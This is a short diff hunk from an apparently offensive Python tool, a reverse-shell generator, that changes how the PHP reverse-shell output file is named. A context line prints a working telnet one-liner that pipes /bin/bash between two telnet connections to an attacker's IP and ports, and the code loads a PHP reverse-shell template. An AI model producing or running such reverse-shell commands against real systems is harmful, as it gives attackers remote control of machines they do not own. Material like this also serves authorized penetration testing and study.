@@ -86,9 +86,7 @@ def gen_revshell(ip,port,shell):
         print(f"telnet {ip} {port} | /bin/bash | telnet {ip} {port+1}")
 
     elif shell == "php":
-
-
-        rev_file = "revshell_"+ip+"_"+port+".php"
+        rev_file = "revshell_"+port+".php"
         final = open(rev_file, "w")
 
         base_file = open("/opt/php_revshell/php-reverse-shell.php", "r")
